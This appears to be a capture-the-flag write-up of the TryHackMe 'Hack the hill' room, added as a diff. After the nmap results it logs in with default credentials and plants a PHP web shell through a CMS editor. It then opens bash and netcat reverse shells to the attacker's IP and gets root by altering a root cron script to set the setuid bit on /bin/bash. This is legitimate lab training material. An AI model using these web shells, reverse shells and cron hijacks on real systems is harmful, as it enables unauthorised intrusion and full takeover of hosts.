@@ -1,0 +1,237 @@
+Hack the hill (EASY)
+
+
+NMAP RESULTS:
+
+Initiating NSE at 23:16
+Completed NSE at 23:16, 0.00s elapsed
+Nmap scan report for 10.10.164.98
+Host is up, received syn-ack (0.19s latency).
+Scanned at 2021-02-20 23:15:01 EST for 106s
+
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f7:75:95:c7:6d:f4:92:a0:0e:1e:60:b8:be:4d:92:b1 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FOhvQRnCoPOd/4kYKsFt1Z81Zn7/eHHCcC1aHXfWK3UskQJaeWDqPcjeXN+ceZbiyKXUBpvAIWlg5Gphn1iCJoWxsCibNzZlZczJmjM2L+fW/maaKRmiFL1fxxgkzNpssK3cF2dyNZ4uitwFhl5imMScEx/E1Lt86545ZxijjmlhUcbxvERh5nC+84RoIRr979qKWvOHgFyLXwOi+FGj5x1DZ0ZcmhsUORX8n9ZsqqUNM01R2MittszQr1CEa0QFvrRyJawV1vHerdaYKaFbwvfR2Ip9d8VI4MmhMqb9fnnwRSYGP3qDKoscJo6UF4wtIMT79/obcXP1GdvoROc7
+|   256 a2:11:fb:e8:c5:c6:f8:98:b3:f8:d3:e3:91:56:b2:34 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCSG/mKt+u+M1pEEuYBYY/LTbDOftPdV5ZBYGyVS0aF5DiRbsYQaOtswUarmEbUO05LIlSUZG6dK88BSm2DjnAU=
+|   256 72:19:b7:04:4c:df:18:be:6b:0f:9d:da:d5:14:68:c5 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3y6QxJnjq+vtxnKq2LJB1EIy+RSy5rZqltZulxj6RA
+80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+8000/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST
+| http-robots.txt: 1 disallowed entry 
+|_/vbcms
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: VeryBasicCMS - Home
+8001/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: My Website
+|_Requested resource was /?page=home.php
+8002/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Learn PHP
+9999/tcp open  abyss?  syn-ack
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Sun, 21 Feb 2021 04:15:11 GMT
+|     Content-Length: 0
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Date: Sun, 21 Feb 2021 04:15:10 GMT
+|_    Content-Length: 0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9999-TCP:V=7.91%I=7%D=2/20%Time=6031DE4C%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,4B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2021\x20Feb\x2020
+SF:21\x2004:15:10\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,4
+SF:B,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2021\x20Feb\x202021\x2004:1
+SF:5:10\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,4B,"H
+SF:TTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2021\x20Feb\x202021\x2004:15:11
+SF:\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(GenericLines,67,"HTTP/1\.1\
+SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf
+SF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(RTSPRequest
+SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
+SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
+SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
+SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
+SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
+SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
+SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
+SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
+SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
+SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
+SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
+SF:equest")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
+SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
+SF:0\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Re
+SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
+SF:20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x2040
+SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
+SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+in port 8000:
+robots.txt
+
+User-agent: *
+Disallow: /vbcms
+
+using default creds admin:admin, i got login as admin
+now we can see that, we can edit the source code of some html files, so we can edit this with our malicious php code and get RCE
+i edit the page (/) with this:
+
+<?php
+system($_GET['c']);
+?>
+
+when i search with appending "?c=id", i got:
+ uid=1000(serv1) gid=1000(serv1) groups=1000(serv1),43(utmp) 
+(REMOTE CODE EXECUTION)
+now lets get a reverse shell:
+
+using this command:
+
+GET /?c=bash+-c+'bash+-i+>%26+/dev/tcp/10.8.73.218/1234+0>%261' HTTP/1.1 (in burpsuit)
+i got a reverse shell
+
+kali@kali:~/Privesc$ nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.116.29] 40968
+bash: cannot set terminal process group (781): Inappropriate ioctl for device
+bash: no job control in this shell
+serv1@web-serv:/var/www/serv1/public$ 
+
+LETS ENUMERATE THE MACHINE
+
+i got a secret.txt, but it is encrypted:(RABBIT HOLE)
+
+serv1@web-serv:/var/www/html/topSecretPrivescMethod$ ls -la
+total 12
+drwxr-xr-x 2 root root 4096 Feb 21 06:47 .
+drwxr-xr-x 3 root root 4096 Feb 21 06:47 ..
+-rw-r--r-- 1 root root  256 Feb 21 06:47 secret.txt
+serv1@web-serv:/var/www/html/topSecretPrivescMethod$ 
+
+i found some interesting cronjobs:
+
+serv1@web-serv:/var/www/serv1$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * *  root /home/serv3/backups/backup.sh
+
+serv1@web-serv:/var/www/serv1$ cat /home/serv3/backups/backup.sh 
+#!/bin/bash
+mv /backups/* /home/serv3/backups/files
+
+this script is just moving the files to a diff directory as root
+
+i also make a reverse shell for serv3(which is on a different port):
+
+echo "Hello World";
+system("bash -c 'bash -i >& /dev/tcp/10.8.73.218/4444 0>&1'");
+
+kali@kali:~/hackthehill$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.144.208] 55942
+bash: cannot set terminal process group (794): Inappropriate ioctl for device
+bash: no job control in this shell
+serv3@web-serv:/var/www/serv3/public$ 
+
+
+as we know that the cronjob is running as root for the user serv3
+can we now modify the contents of the backup.sh file?
+YES WE CAN!!
+
+we saw a backups folder in the root directory, it has writable permissions, so lets try for privecs using these infos we have but
+not able to write in the backups folder with is in root directory
+
+got the second flag:
+serv3@web-serv:/var/www$ grep -iR "thm{"
+serv4/index.php:THM{REDECATED}
+serv3@web-serv:/var/www$ 
+
+
+using the cronjobs i change the backup.sh file with a reverse shell code which will run as root and gives me a root shell
+
+serv3@web-serv:/home/serv3/backups$ cat backup.sh 
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 4444 >/tmp/f
+serv3@web-serv:/home/serv3/backups$ 
+
+i dont know why im not able to get the reverse shell so i decided to do another thing, i make the '/bin/bash' as an suit bit 
+so add: 'chmod +x /bin/bash' in the backups.sh file then watch the '/bin/bash' file to get a sticky bit on it
+
+serv3@web-serv:/home/serv3/backups$ ls -la /bin/bash 
+-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
+bash-4.4# id
+uid=1002(serv3) gid=1002(serv3) euid=0(root) egid=0(root) groups=0(root),1002(serv3)
+bash-4.4# 
+
+IM ROOT NOW 
+
+
+bash-4.4# cat /root/root.txt 
+THM{REDECATED}
+bash-4.4# 
+
+got the root flag
+
+bash-4.4# cat games/fortune 
+VEhNe05HSTROem{REDECATED}05qTXlaalkxfQo=
+
+kali@kali:~$ echo "VEhNe05HSTROe{REDECATED}ldZd05qTXlaalkxfQo=" | base64 -d
+THM{REDECATED}
+
+got the first flag
+
+now i got the fourth flag(this was the bug now fixed):
+
+serv3@web-serv:/var/lib$ cat rary 
+ _____ _   _ __  __   ______       _    __   __          _              ____ _ 
+|_   _| | | |  \/  | / / __ )  ___| |_  \ \ / /__  _   _( )_ __ ___    / ___| |
+  | | | |_| | |\/| || ||  _ \ / _ \ __|  \ V / _ \| | | |/| '__/ _ \  | |  _| |
+  | | |  _  | |  | < < | |_) |  __/ |_    | | (_) | |_| | | | |  __/  | |_| | |
+  |_| |_| |_|_|  |_|| ||____/ \___|\__|___|_|\___/ \__,_| |_|  \___|___\____|_|
+                     \_\             |_____|                      |_____|      
+=================================REDECATED========================================  
+      _   _           _   __   
+     | | | | __ _ ___| |__\ \  
+     | |_| |/ _` / __| '_ \| | 
+     |  _  | (_| \__ \ | | |> >
+ ____|_| |_|\__,_|___/_| |_| | 
+|_____|                   /_/  
+which can be interpreted as:
+
+THM{REDECATED}
